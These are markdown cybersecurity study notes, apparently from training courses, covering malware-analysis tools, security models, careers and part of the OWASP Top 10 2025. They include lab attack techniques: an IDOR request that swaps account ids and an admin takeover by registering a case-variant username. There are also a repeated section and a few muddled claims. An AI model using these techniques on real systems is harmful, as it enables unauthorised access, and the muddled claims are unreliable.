| **Qualys** | Cloud-based | Continuous monitoring, compliance |
| **Nexpose** | Proprietary | Risk scoring, continuous discovery |
| **OpenVAS** | Open-source | Basic scanning, lightweight |

**OpenVAS (Docker)**:
```bash
sudo apt install docker.io
sudo docker run -d -p 443:443 --name openvas immauss/openvas
```

**Scan Process**:
1. Click "Scans" → "Tasks" → "New Task"
2. Enter task name and target IP
3. Configure scan options
4. Click play to execute
5. Review results in dashboard
6. Export reports

---

### Defense in Depth

**Key Principle**: Use multiple security controls together for comprehensive protection.

**Core Controls**:
- Firewalls (prevent unauthorized access)
- IDS (detect threats that bypass firewalls)
- Vulnerability scanners (identify weaknesses)

**Best Practices**:
- Keep systems patched regularly
- Use multiple layers of security
- Monitor network for suspicious activity
- Regularly review and update configurations
- Stay informed about new vulnerabilities

---

## 🔧 Defensive Security Tooling

### REMnux

**REMnux** is a Linux distribution for analyzing potentially malicious programs, documents, files, memory, and similar objects. Designed for malware analysis and incident response.

---

### INetSim: Internet Services Simulation Suite

**Purpose**: Simulates a real network environment for observing malware behavior without complex infrastructure.

**VM Setup**:
- **REMnux Machine**: Main analysis machine
- **AttackBox**: Provides network access

**Configuration**:
```bash
# 1. Check IP
ifconfig

# 2. Edit config
sudo nano /etc/inetsim/inetsim.conf
# Change: dns_default_ip 0.0.0.0
# To: dns_default_ip  MACHINE_IP

# 3. Verify
cat /etc/inetsim/inetsim.conf | grep dns_default_ip

# 4. Start
sudo inetsim
````

**Expected Output**:
```
=== INetSim main process started (PID 4859) ===
Session ID:     4859
Listening on:   MACHINE_IP
Forking services...
  * dns_53_tcp_udp - started
  * https_443_tcp - started
````

**Testing**:
```bash
# From AttackBox browser
https://MACHINE_IP

# From AttackBox CLI
sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
sudo wget https://MACHINE_IP/second_payload.ps1 --no-check-certificate
````

**Connection Report**:
```bash
# Report location: /var/log/inetsim/report/
# Read report
sudo cat /var/log/inetsim/report/report.<PID>.txt
```
---

### Volatility 3: Memory Forensics

**Purpose**: Dump analysis framework for Windows memory forensics.

**Common Plugins**:

| Plugin | Command | Use Case |
|--------|---------|----------|
| **PsTree** | `vol3 -f wcry.mem windows.pstree.PsTree` | Parent-child relationships |
| **PsList** | `vol3 -f wcry.mem windows.pslist.PsList` | All active processes |
| **CmdLine** | `vol3 -f wcry.mem windows.cmdline.CmdLine` | Process command args |
| **FileScan** | `vol3 -f wcry.mem windows.filescan.FileScan` | File objects in memory |
| **DllList** | `vol3 -f wcry.mem windows.dlllist.DllList` | Loaded DLLs |
| **PsScan** | `vol3 -f wcry.mem windows.psscan.PsScan` | Process enumeration |
| **Malfind** | `vol3 -f wcry.mem windows.malfind.Malfind` | Suspicious memory injection |

**Bulk Processing with Loops**:
```bash
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do
  vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
done
````

**Extract Strings**:
```bash
# ASCII strings
strings wcry.mem > wcry.strings.ascii.txt

# Unicode little-endian
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt

# Unicode big-endian
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

---

### Volatility 3: Memory Forensics

**Purpose**: Dump analysis framework for Windows memory forensics.

**Common Plugins**:
| Plugin | Command | Use Case |
|--------|---------|----------|
| PsTree | `vol3 -f wcry.mem windows.pstree.PsTree` | Parent-child relationships |
| PsList | `vol3 -f wcry.mem windows.pslist.PsList` | All active processes |
| CmdLine | `vol3 -f wcry.mem windows.cmdline.CmdLine` | Process command args |
| FileScan | `vol3 -f wcry.mem windows.filescan.FileScan` | File objects in memory |
| DllList | `vol3 -f wcry.mem windows.dlllist.DllList` | Loaded DLLs |
| PsScan | `vol3 -f wcry.mem windows.psscan.PsScan` | Process enumeration |
| Malfind | `vol3 -f wcry.mem windows.malfind.Malfind` | Suspicious memory injection |

**Bulk Processing with Loops**:
```bash
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do
  vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
done
````

**Extract Strings**:
```bash
# ASCII strings
strings wcry.mem > wcry.strings.ascii.txt

# Unicode little-endian
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt

# Unicode big-endian
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

---

### FlareVM: Arsenal of Tools

**Purpose**: Comprehensive toolkit for reverse engineers, malware analysts, and incident responders.

**Tool Categories**:
| Category | Tools |
|----------|-------|
| Reverse Engineering | x64dbg, OllyDbg, Radare2, Binary Ninja, PEiD |
| Disassemblers | CFF Explorer, Hopper, RetDec |
| Static/Dynamic Analysis | Process Hacker, PEview, Dependency Walker, DIE |
| Forensics | Volatility, Rekall, FTK Imager |
| Network | Wireshark, Nmap, Netcat |
| File Analysis | FileInsight, Hex Fiend, HxD |
| Scripting | Python, Empire |
| Sysinternals | Autoruns, Process Explorer, Process Monitor |

**Key Investigation Tools**:
| Tool | Purpose | Investigation Value |
|------|---------|---------------------|
| Procmon | Track file/registry activity | Filter for LSASS.exe, credential dumping attempts |
| Process Explorer | In-depth process insights | Monitor processes spawned from documents |
| HxD | Hex editor | Identify file types by headers, examine binary data |
| CFF Explorer | File information | Generate hashes, verify authenticity |
| Wireshark | Network analysis | TLS/SSL connections, data exfiltration patterns |
| PEStudio | Static analysis | Analyze executables without execution risk |
| FLOSS | Obfuscated string extraction | Extract strings from malware programs |

**FLOSS Usage**:
```bash
floss .\cobaltstrike.exe
````

**Output Types**:
- Static strings (hardcoded)
- Stackstrings (stack-stored)
- Tightstrings (embedded in code)
- Decoded strings

---

### Standard Investigation Tools

**Process Monitor (Procmon)**:
- Records file, registry, and thread activity in real-time
- **LSASS.exe Filter**: Look for authentication activity and credential dumping

**Process Explorer (Procexp)**:
- Shows process and parent-child relationships
- **Document Analysis**: Monitor processes spawned from Word, Excel, PDF, ISO files

**HxD**:
- View/edit hex data
- **Header Analysis**: 4D 5A = Little Endian = PE executable

**CFF Explorer**:
- File hashes (SHA-1, SHA-256, MD5)
- PE file structure validation

**Wireshark**:
- TLS/SSL connections
- Encrypted traffic patterns

**PEStudio**:
- Static executable analysis without running
- Metadata and executable structure analysis

**FLOSS**:
- Extracts and de-obfuscates strings
- Advanced decoding beyond basic `strings`

---

### Key Concepts Summary

**Malware Analysis Workflow**:
1. **Network Analysis**: Use INetSim to simulate network behavior
2. **Memory Forensics**: Volatility plugins for process/file/DLL analysis
3. **Static Analysis**: HxD, CFF Explorer, PEStudio, FLOSS
4. **Dynamic Analysis**: Process Monitor, Process Explorer

**Preprocessing Best Practice**:
> Run tools and save results in text or format. Preprocessing is critical for later examination and creates organized, searchable evidence.

**Common Commands**:
```bash
# Volatility bulk processing
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pslist.PsList windows.cmdline.CmdLine; do
  vol3 -q -f image.mem $plugin > image.$plugin.txt
done

# String extraction
strings -e l image.mem > image.strings.txt
```
# Building Your Cybersecurity Career

## Table of Contents
- [Security Principles](#security-principles)
  - [CIA Triad](#cia-triad)
  - [Parkerian Hexad](#parkerian-hexad)
  - [Security Models](#security-models)
  - [ISO/IEC 19249 Principles](#isoiec-19249-principles)
  - [Security Concepts](#security-concepts)
- [Careers in Cybersecurity](#careers-in-cybersecurity)
  - [Job Roles Overview](#job-roles-overview)
  - [Required Skills](#required-skills)
- [Training Impact on Teams](#training-impact-on-teams)
  - [Why Training Matters](#why-training-matters)
  - [Vendor Selection](#vendor-selection)

---

## Security Principles

### CIA Triad

**Confidentiality, Integrity, and Availability (CIA)** form the foundation of information security. When assessing a system's security, you must evaluate all three components.

| Component | Definition | Real-World Example |
|-----------|------------|-------------------|
| **Confidentiality** | Ensures that only intended recipients can access data | Credit card numbers only disclosed to payment processors |
| **Integrity** | Ensures data cannot be altered and detects if it is altered | Medical records must remain accurate and unmodified |
| **Availability** | Ensures system/service is available when needed | Hospital systems must be accessible for patient care |

**Online Shopping Example:**
- **Confidentiality**: Your credit card info should only be shared with the payment processor. If not trusted, you won't complete the transaction.
- **Integrity**: An intruder must not alter your shipping address after you submit it.
- **Availability**: The online store must be accessible when you browse and place orders.

**Patient Records Example:**
- **Confidentiality**: Healthcare providers must maintain medical records' confidentiality (legal requirement).
- **Integrity**: Altered records can lead to wrong treatments and life-threatening situations.
- **Availability**: Medical practitioners must access records during patient visits.

> **Note**: The emphasis on each component varies by scenario. A university announcement has critical **integrity** but low confidentiality requirements.

### Parkerian Hexad

Proposed by Donn Parker in 1998, the Parkerian Hexad expands on CIA with six security elements:

| Element | Definition | Example |
|---------|------------|---------|
| **Confidentiality** | Information accessible only to authorized parties | Encryption protects sensitive data |
| **Integrity** | Information is complete and accurate | Database transactions maintain record accuracy |
| **Availability** | Information is accessible when needed | 99.9% uptime SLA for critical systems |
| **Authenticity** | Information is from claimed source | Digital signatures verify document origin |
| **Possession** | Information is under control | Physical access controls and device encryption |
| **Utility** | Information is in a usable form | Decrypted data is readable and actionable |

**Utility** Example: You have encrypted storage, but lose the decryption key. The data is unavailable (not in usable form) despite being on disk.

**Possession** Example: Ransomware encrypts your data, or an adversary steals backup drives — you lose control of the information.

### Security Models

Security models provide frameworks for implementing security principles.

#### Bell-LaPadula Model

**Purpose:** Achieves **confidentiality** through three rules:

| Property | Name | Rule | Effect |
|----------|------|------|--------|
| **Simple Security Property** | "No read up" | Subject at lower level cannot read object at higher level | Prevents unauthorized access to sensitive data |
| **Star(*) Security Property** | "No write down" | Subject at higher level cannot write to object at lower level | Prevents disclosure of sensitive data to lower-level subjects |
| **Discretionary Security Property** | Access Matrix | Uses access control matrices to define permissions | Combines with other properties for flexible access control |

**Example Access Matrix:**
```
         Object A  Object B
Subject 1   Write     No Access
Subject 2   Read/Write Read
```

**Summary:** "Write up, read down" — share confidential data with higher clearance levels and receive data from lower clearance levels.

**Limitations:** Not designed for file-sharing scenarios.

#### Biba Model

**Purpose:** Achieves **integrity** through two rules:

| Property | Name | Rule | Effect |
|----------|------|------|--------|
| **Simple Property** | "No read down" | Higher subject should not read from lower object | Prevents pollution from untrusted sources |
| **Star(*) Property** | "No write up" | Lower subject should not write to higher object | Prevents contamination of trusted data |

**Summary:** "Read up, write down" — receive data from trusted sources and submit data to trusted destinations.

**Contrast:** Bell-LaPadula focuses on confidentiality; Biba focuses on integrity.

**Limitations:** Does not handle internal threats (insider threats).

#### Clark-Wilson Model

**Purpose:** Achieves **integrity** through structured approach:

| Concept | Definition | Example |
|---------|------------|---------|
| **Constrained Data Item (CDI)** | Data requiring integrity protection | Transaction records, user accounts |
| **Unconstrained Data Item (UDI)** | All other data types | User input, system parameters |
| **Transformation Procedures (TPs)** | Programs maintaining CDI integrity | Database update operations |
| **Verification Procedures (IVPs)** | Programs verifying CDI validity | Integrity checks on transaction data |

### ISO/IEC 19249 Principles

#### Architectural Principles

1. **Domain Separation**
   - Related components grouped as single entity
   - Each entity has its own domain and security attributes
   - Example: x86 privilege levels (ring 0 for kernel, ring 3 for user-mode)

2. **Layering**
   - Systems structured into abstract levels
   - Security policies applied at different levels
   - Validation becomes feasible
   - Example: OSI model layers, high-level disk I/O abstractions

3. **Encapsulation**
   - Hide low-level implementations
   - Prevent direct manipulation
   - Example: Object methods vs. direct variable access, proper APIs for database access

4. **Redundancy**
   - Ensures availability and integrity
   - Examples: Dual power supplies, RAID 5, parity-based error detection

5. **Virtualization**
   - Share hardware among multiple OSs
   - Sandbox capabilities, secure detonation of malware

#### Design Principles

1. **Least Privilege** ("Need-to-Know Basis")
   - Provide minimum permissions required for tasks
   - Principle: Only what's needed, nothing more

2. **Attack Surface Minimization**
   - Identify and eliminate unnecessary attack vectors
   - Disable unused services, reduce attack surface

3. **Centralized Parameter Validation**
   - Centralize input validation in single library/system
   - Prevents DoS, RCE, and other input-based vulnerabilities

4. **Centralized General Security Services**
   - Centralize authentication, authorization, logging
   - Manage single point of failure through proper measures

5. **Preparing for Error and Exception Handling**
   - Design systems to fail safe
   - Error messages should not leak confidential information

### Security Concepts

#### Defence-in-Depth

**Definition:** Multi-layered security approach with multiple levels of protection.

**Analogy:** Protecting expensive items with multiple barriers:
- Drawer lock → Room lock → Apartment door → Building gate → Security cameras

**Benefits:**
- Blocks most attackers
- Slows down determined attackers
- Provides defense in depth even if one layer fails

#### Trust but Verify

**Principle:** Verify security even when you trust entities.
- Verification requires proper logging and monitoring
- Automated security mechanisms (SIEM, IDS/IPS)
- Not feasible to verify everything manually

#### Zero Trust

**Principle:** "Never trust, always verify." Treat trust as a vulnerability.

**Key Characteristics:**
- Every entity considered adversarial until proven otherwise
- No trust based on location or device ownership
- Requires authentication and authorization for all access
- Contains breaches better than traditional models

**Implementation:** Microsegmentation limits network segments to single hosts with strict access controls.

#### Vulnerability, Threat, Risk

| Term | Definition | Example |
|------|------------|---------|
| **Vulnerability** | Weakness that can be exploited | Unpatched SQL injection in web application |
| **Threat** | Potential danger from vulnerability | Attacker using known exploit against vulnerable system |
| **Risk** | Likelihood of threat exploiting vulnerability × impact | High probability of database breach impacting 1M patients |

**Showroom Example:** Glass doors/windows = vulnerability → Someone breaking them = threat → Insurance premium increase = risk

#### Shared Responsibility Model

**Cloud Security Framework:**

| Cloud Service | Responsibilities |
|---------------|------------------|
| **IaaS** (Infrastructure) | Complete control over OS, networking, security configuration |
| **PaaS** (Platform) | Application and data security; limited OS access |
| **SaaS** (Software) | Data and application usage; minimal platform access |

Both provider and user must fulfill their respective responsibilities.

---

## Careers in Cybersecurity

### Job Roles Overview

| Role | Focus | Key Activities |
|------|-------|----------------|
| **Security Analyst** | Monitoring, analyzing, and improving security | Network analysis, reporting, developing security plans |
| **Security Engineer** | Implementing security solutions | Testing security measures, mitigating vulnerabilities |
| **Incident Responder** | Responding to security breaches | Creating response plans, handling real-time incidents |
| **Digital Forensic Investigator** | Collecting and analyzing evidence | Evidence collection, analysis, reporting |
| **Malware Analyst** | Analyzing malicious software | Static/dynamic analysis, reverse-engineering |
| **Penetration Tester** | Testing systems for vulnerabilities | Systematic hacking, exploitation, reporting |
| **Red Teamer** | Testing detection and response capabilities | Emulating threat actors, maintaining access |

### Security Analyst

**Overview:** Integral to constructing security measures across organizations to protect against attacks. Explores and evaluates company networks to uncover actionable data.

**Responsibilities:**
- Work with stakeholders to analyze cybersecurity posture
- Compile security reports documenting issues and measures
- Develop security plans based on attack trends and new tools

### Security Engineer

**Overview:** Develops and implements security solutions using threat and vulnerability data. Works across multiple attack types (web, network, emerging threats).

**Responsibilities:**
- Test and screen security measures across software
- Monitor networks and update systems to mitigate vulnerabilities
- Identify and implement optimal security systems

### Incident Responder

**Overview:** Responds productively and efficiently to security breaches. Often high-pressure position with real-time assessment and response requirements.

**Key Metrics:**
- **MTTD** (Mean Time To Detect)
- **MTTA** (Mean Time To Acknowledge)
- **MTTR** (Mean Time To Recover)

**Responsibilities:**
- Develop actionable incident response plans
- Maintain security best practices
- Post-incident reporting and preparation

### Digital Forensic Investigator

**Overview:** If you like to play detective, this might be the perfect job. Law enforcement focuses on collecting and analyzing evidence for crimes; corporate investigators use forensic skills for policy violations.

**Responsibilities:**
- Collect digital evidence while observing legal procedures
- Analyze evidence to find answers
- Document findings and report on cases

### Malware Analyst

**Overview:** Analyzes suspicious programs, discovers their behavior, and writes reports. Often called a "reverse-engineer" as they convert compiled programs to readable code.

**Required Skills:**
- Strong programming background
- Low-level languages (Assembly, C)
- Static and dynamic analysis techniques

**Responsibilities:**
- Perform static analysis and reverse-engineering
- Conduct dynamic analysis in controlled environments
- Document and report findings

### Penetration Tester (Pentester/Ethical Hacker)

**Overview:** Tests security of systems and software by systematically attempting to uncover flaws and vulnerabilities.

**Responsibilities:**
- Conduct tests on systems, networks, and web applications
- Perform security assessments, audits, and policy analysis
- Evaluate and report insights with actionable recommendations

### Red Teamer

**Overview:** Similar to penetration testers but more targeted. Tests company's detection and response capabilities by emulating cyber criminals.

**Key Differences:**
| Penetration Tester | Red Teamer |
|-------------------|------------|
| Uncover many vulnerabilities | Test detection and response capabilities |
| Broad security assessment | Targeted, realistic attack simulation |
| Shorter duration | Can run for up to a month |
| External team | Often external team |

**Responsibilities:**
- Emulate threat actors, maintain access, avoid detection
- Assess security controls and incident response procedures
- Evaluate and report actionable data

### Required Skills by Role

| Skill Area | Entry-Level | Advanced |
|------------|-------------|----------|
| **Networking** | TCP/IP, DNS, HTTP | OSI model, routing protocols, deep packet analysis |
| **Operating Systems** | Windows/Linux basics | System internals, kernel operations |
| **Scripting/Programming** | Python, Bash | Advanced scripting, reverse engineering tools |
| **Security Tools** | Basic scanners, SIEM | Custom tool development, exploit analysis |
| **Problem Solving** | Basic troubleshooting | Complex incident analysis |
| **Soft Skills** | Communication | Stakeholder management, leadership |

---

## Training Impact on Teams

### Why Training Matters

**Key Benefits:**
1. **Prevention vs. Cure:** Better to learn in training environment than during live incidents
2. **Quality of Work:** Proper training increases team effectiveness
3. **Productivity:** Reduces likelihood of incidents
4. **Capacity:** Increases team capability without hiring

**Real Power of Training:**
- Team prepared for what's coming
- No need to learn new techniques during attacks
- Junior staff can ramp up quickly
- Senior staff don't repeat training material

**Team Benefits:**
- Common baseline for skill assessment
- Clearer career paths
- Fosters teamwork (e.g., CTF challenges build relationships)

### Vendor Selection

**Key Questions to Ask:**

1. **Target Audience**
   - Who are we training? (Role, experience level, technical background)

2. **Vendor Experience**
   - Experience with similar organizations?

3. **Content Quality**
   - Breadth, depth, and quality of relevant topics

4. **Platform Capabilities**
   - Single platform for learning, training, and practice
   - Integration options (SSO, APIs)

5. **Cost Considerations**
   - While cost matters, it's dwarfed by productivity benefits

**TryHackMe Features:**
- **Content Studio:** Modify or create custom modules
- **Business Plans:** Integrated training solutions
- **Classrooms:** Educational institutions support

### Financial Impact of Training

**Case Study:**
```
Situation: 10 employees in cybersecurity team
Annual Cost per Employee: $80,000
Productivity Increase: 4%
Training Cost per Employee: $500

Calculation:
- Gains from training: 10 × 4% × $80,000 = $32,000
- Training cost: 10 × $500 = $5,000
- ROI: $32,000 / $5,000 = 640%
```

### Training Proposal Tips

**Key Components:**
- Include concrete metrics and ROI calculations
- Highlight prevention benefits
- Show how training aligns with business goals
- Use real-world examples from your organization

---

## Key Takeaways

### Security Fundamentals
- **CIA Triad**: Confidentiality, Integrity, Availability — all three must be balanced
- **Parkerian Hexad**: Adds Authenticity, Possession, and Utility to CIA
- **Security Models**: Bell-LaPadula (confidentiality), Biba (integrity), Clark-Wilson (integrity)
- **ISO/IEC 19249**: Five architectural and five design principles for secure systems

### Security Concepts
- **Defence-in-Depth**: Multiple layers of security protection
- **Zero Trust**: "Never trust, always verify" approach
- **Vulnerability vs. Threat vs. Risk**: Understanding the differences is critical
- **Shared Responsibility**: Clear separation in cloud environments

### Career Path
- Multiple cybersecurity roles with distinct focus areas
- Required skills progression from entry-level to advanced
- Continuous learning is essential in cybersecurity
- Certifications and practical experience are valuable

### Team Training
- Training reduces incidents and improves productivity
- ROI can be significant (640% in example case)
- Customization and integration matter for enterprise solutions
- Practical, hands-on learning is most effective

### Next Steps
1. Choose your area of interest (offensive or defensive)
2. Build foundational skills in networking, systems, and programming
3. Gain hands-on experience through practice platforms
4. Obtain relevant certifications
5. Join the cybersecurity community
6. Stay current with emerging threats and technologies

---

## Practice Questions

### Security Principles

1. Which component of the CIA Triad is compromised when a malicious actor alters patient records?
   a) Confidentiality
   b) Integrity
   c) Availability
   d) Authenticity

2. In the Bell-LaPadula model, what does the "no write down" property prevent?
   a) Subjects reading data at higher security levels
   b) Subjects writing data at lower security levels
   c) Subjects reading data at lower security levels
   d) Subjects writing data at higher security levels

3. Which ISO/IEC 19249 design principle relates to providing users with only the permissions they need?
   a) Centralized Parameter Validation
   b) Attack Surface Minimisation
   c) Least Privilege
   d) Preparing for Error and Exception Handling

4. What is the difference between a vulnerability and a threat?
   a) A vulnerability is a weakness; a threat is the potential danger
   b) A vulnerability is a potential danger; a threat is a weakness
   c) They are interchangeable terms
   d) A vulnerability is a confirmed exploit; a threat is a possibility

5. In Zero Trust architecture, which principle is NOT followed?
   a) All access requires authentication
   b) Trust is granted based on location
   c) Every entity is verified before access
   d) Trust is never assumed by default

### Career Questions

6. Which role focuses on emulating threat actors to test an organization's detection and response capabilities?
   a) Security Analyst
   b) Penetration Tester
   c) Red Teamer
   d) Incident Responder

7. What is the primary focus of the Bell-LaPadula security model?
   a) Integrity
   b) Confidentiality
   c) Availability
   d) Authenticity

8. Which of the following is NOT a responsibility of a Security Engineer?
   a) Testing security measures
   b) Emulating threat actors
   c) Monitoring networks
   d) Identifying security systems

9. What is the primary goal of the Clark-Wilson security model?
   a) To achieve confidentiality
   b) To achieve integrity
   c) To ensure availability
   d) To prevent unauthorized access

10. If you lose the decryption key to encrypted data, which Parkerian Hexad element is affected?
    a) Confidentiality
    b) Utility
    c) Possession
    d) Authenticity

### Answers

1. b) Integrity
2. b) Subjects writing data at lower security levels
3. c) Least Privilege
4. a) A vulnerability is a weakness; a threat is the potential danger
5. b) Trust is granted based on location
6. c) Red Teamer
7. b) Confidentiality
8. b) Emulating threat actors (Red Teamer responsibility)
9. b) To achieve integrity
10. b) Utility

---

## Additional Resources

- **TryHackMe Business**: https://business.tryhackme.com
- **TryHackMe Classrooms**: https://tryhackme.com/classrooms
- **ISO/IEC 19249 Standard**: Official ISO documentation
- **CompTIA Security+**: Industry-standard certification
- **CEH (Certified Ethical Hacker)**: Offensive certification
- **OSCP (Offensive Security Certified Professional)**: Advanced practical certification
- **CISSP (Certified Information Systems Security Professional)**: Master-level certification

---

*This document is designed to help you build your cybersecurity career. Master the fundamentals, gain hands-on experience, and stay curious about new threats and technologies.*# OWASP Top 10 2025: Complete Reference Guide

## Table of Contents

1. [IAAA Failures](#iaaa-failures)
2. [Application Design Flaws](#application-design-flaws)
3. [Insecure Data Handling](#insecure-data-handling)

---

## IAAA Failures

### Overview

**IAAA** (Identity, Authentication, Authorisation, Accountability) represents the four pillars of secure web application design. This section covers three Top 10 2025 categories related to failures in how IAAA is implemented.

### The Four Pillars

| Pillar | Definition | Example |
|--------|------------|---------|
| **Identity** | The unique account representing a person or service (e.g., user ID, email) | `user_id: "john.doe"` |
| **Authentication** | Proving that identity (passwords, OTP, passkeys) | Login with credentials |
| **Authorisation** | What that identity is allowed to do | Admin vs. user permissions |
| **Accountability** | Recording and alerting on who did what, when, and from where | Audit logs |

> **Critical Point**: Each item plays a crucial role. If a previous item isn't being performed, you cannot perform the later items. It's a chain of trust.

### Covered Categories

- **A01: Broken Access Control** - Server doesn't properly enforce who can access what
- **A07: Authentication Failures** - Application can't reliably verify or bind user identity
- **A09: Logging & Alerting Failures** - Security-relevant events aren't recorded or alerted on

### A01: Broken Access Control

#### What It Is

Broken access control occurs when the server doesn't properly enforce authorization checks on every request. The application trusts the client too much and allows unauthorized actions.

#### Key Concept: IDOR

**Insecure Direct Object Reference (IDOR)** is a common type of broken access control where changing an ID parameter allows unauthorized access to data:

```
# Normal request:
GET /api/account?id=7

# Attacker changes the ID:
GET /api/account?id=6
```

If this allows access to another user's data, access control is broken.

#### Types of Privilege Escalation

| Type | Description | Example |
|------|-------------|---------|
| **Horizontal** | Same role, accessing another user's resources | User accessing User B's profile |
| **Vertical** | Lower role accessing admin-only actions | Regular user accessing admin dashboard |

#### Practical Example

> **Challenge**: Start the static site and modify the `accountID` parameter in the URL. Identify which user has more than $1,000,000 in their account!

#### Prevention

- Enforce server-side checks on **every** request
- Never trust client-supplied identifiers
- Validate ownership before granting access
- Use proper role-based access control (RBAC)
- Implement least privilege principles

---

### A07: Authentication Failures

#### What It Is

Authentication failures happen when an application can't reliably verify or bind a user's identity to their session.

#### Common Vulnerabilities

| Vulnerability | Description | Impact |
|---------------|-------------|--------|
| **Username Enumeration** | App reveals whether a username exists | Helps attackers target specific users |
| **Weak/Guessable Passwords** | No lockout, no rate limiting | Brute force attacks succeed |
| **Logic Flaws** | Broken login/registration flow | Account takeover possible |
| **Insecure Session Handling** | Session cookies not properly protected | Session hijacking |

#### Prevention Checklist

1. **Database Level**: Enforce unique indexes on canonical username forms (case-insensitive)
2. **Rate Limiting**: Implement rate limits and account lockouts on login attempts
3. **Session Management**: Rotate session tokens on password/privilege changes
4. **Response Handling**: Provide consistent error messages to prevent enumeration
5. **Security Headers**: Use proper cookie flags (`HttpOnly`, `Secure`, `SameSite`)

> **Challenge**: Try to break into the admin account by registering with username "aDmiN" (case variations). Then log in as the admin to get the flag!

#### Advanced Topics

- JWT validation and signing
- OAuth 2.0/OpenID Connect implementation
- Multi-factor authentication (2FA/MFA)
- Passkey/WebAuthn implementation

---

### A09: Logging & Alerting Failures

#### Why Logging Matters

Good logging underpins accountability—the ability to prove who did what, when, and from where. Without proper logging, defenders can't detect or investigate attacks.

#### What Goes Wrong

| Issue | Description | Example |
|-------|-------------|---------|
| Missing auth events | No logs for successful/fail attempts | Can't track authentication history |
| Vague error messages | Generic errors don't reveal issues | Attackers learn what to exploit |
| No alerting | No notifications for suspicious activity | Attacks go undetected |
| Short retention | Logs deleted too quickly | Post-incident investigation impossible |
| Tamperable storage | Logs stored where attackers can modify | Attackers cover their tracks |

#### Prevention Best Practices

1. **Comprehensive Logging**: Log the full authentication lifecycle
   - Fail/success events
   - Password changes, 2FA attempts
   - Role/privilege changes
   - Admin actions

2. **Centralised Logging**: Off-host storage (SIEM, log management service)

3. **Retention Policy**: Store logs long enough for investigation

4. **Alerting**: Trigger alerts on anomalies
   - Brute force bursts
   - Privilege elevation
   - Unusual locations/times
   - Failed authentication spikes

5. **Integrity Protection**: Sign logs or use append-only storage

> **Challenge**: Investigate an attack on the application. Identify what happened by examining logs. Think about how difficult this would be if key information was missing!

---

### Summary: IAAA Takeaways

| Category | Key Prevention |
|----------|----------------|
| **A01** | Enforce server-side checks on every request |
| **A07** | Unique indexes, rate limiting, session rotation |
| **A09** | Log full auth lifecycle, centralise off-host, alert on anomalies |

---

## Application Design Flaws

### Overview

This section covers four Top 10 2025 categories related to failures in architecture and system design.

### Covered Categories

- **AS02: Security Misconfigurations** - Unsafe defaults and exposed services
- **AS03: Software Supply Chain Failures** - Compromised third-party components
- **AS04: Cryptographic Failures** - Incorrect encryption usage
- **AS06: Insecure Design** - Flawed logic and architecture

---

### AS02: Security Misconfigurations

#### What It Is

Security misconfigurations occur when systems, servers, or applications are deployed with unsafe defaults, incomplete settings, or exposed services. These are not code bugs but mistakes in environment, software, or network setup.

#### Why It Matters

Even small misconfigurations can expose sensitive data, enable privilege escalation, or give attackers a foothold.

> **Real-World Example**: In 2017, Uber exposed a backup bucket containing sensitive driver and rider data because the bucket was publicly accessible. Attackers could download data without credentials—simply a deployment mistake with significant consequences.

#### Common Misconfiguration Patterns

| Pattern | Description |
|---------|-------------|
| Default credentials left unchanged | `admin/admin`, `root/123456` |
| Unnecessary services exposed | Debug endpoints, admin panels |
| Misconfigured cloud storage | Public S3/Azure Blob/GCP buckets |
| Unrestricted access | No authentication on sensitive resources |
| Verbose error messages | Stack traces, system version info exposed |
| Outdated software | Known vulnerable versions running |
| Exposed endpoints | `/`, `/admin`, `/debug` without controls |

#### Prevention Strategies

1. **Harden Defaults**: Remove unused features and services
2. **Authentication & Least Privilege**: Enforce strong auth and proper permissions
3. **Network Segmentation**: Limit exposure of sensitive resources
4. **Keep Updated**: Patch software, frameworks, containers regularly
5. **Error Handling**: Hide stack traces and system information
6. **Cloud Auditing**: Regular configuration reviews
7. **Secure Endpoints**: Protect automation services with proper access controls
8. **CI/CD Integration**: Include configuration reviews and automated security checks

---

### AS03: Software Supply Chain Failures

#### What It Is

Software supply chain failures occur when applications rely on components, libraries, services, or models that are compromised, outdated, or improperly verified.

> **Note**: These weaknesses aren't in your code, but in the software and tools you depend on.

#### Why It Matters

Modern applications are built from many third-party packages. One compromised dependency can compromise your entire system.

> **Real-World Example**: The 2021 SolarWinds Orion compromise showed the danger of supply chain attacks. Attackers inserted malicious code into a trusted update, affecting thousands of organizations that automatically installed it. Not a bug in core logic—a flaw in the update process.

#### Supply Chain Risks in AI/LLM Systems

With AI, we see similar risks when using:
- Unverified third-party models
- Fine-tuned datasets with hidden behaviors
- Backdoors or biased outputs

#### Common Supply Chain Patterns

| Pattern | Description |
|---------|-------------|
| Unverified/unmaintained libraries | Using obscure dependencies |
| Automatic updates without verification | Installing patches blindly |
| Over-reliance on third-party models | No monitoring or auditing |
| Insecure build processes | Allowing tampering in CI/CD |
| Poor license tracking | No provenance information |
| Lack of post-deployment monitoring | Unknown when dependencies are exploited |

#### Prevention Strategies

1. **Verify Components**: Check all third-party libraries and models before use
2. **Monitor Dependencies**: Regular patching and vulnerability scanning
3. **Sign & Verify**: Cryptographic verification of software updates
4. **Secure Build Processes**: Lock down CI/CD pipelines
5. **Track Provenance**: Document origin and licensing of all dependencies
6. **Runtime Monitoring**: Watch for unusual behavior from dependencies
7. **Threat Modelling**: Include supply chain in development workflows

---

### AS04: Cryptographic Failures

#### What It Is

Cryptographic failures occur when encryption is used incorrectly or not at all. This includes weak algorithms, hard-coded keys, poor key handling, or unencrypted sensitive data.

#### Why It Matters

Web applications rely on cryptography everywhere: network traffic, stored data, identity verification, and secrets. When these controls fail, sensitive data exposure leads to account takeovers or breaches.

#### Attack Vectors

- Man-in-the-middle attacks
- Brute force on weak keys
- Discovery of hard-coded secrets
- Poor key management

#### Common Cryptographic Failures

| Failure | Description | Modern Alternatives |
|---------|-------------|---------------------|
| Weak algorithms | DES, MD5, SHA-1, ECB mode | AES-256-GCM, ChaCha20-Poly1305 |
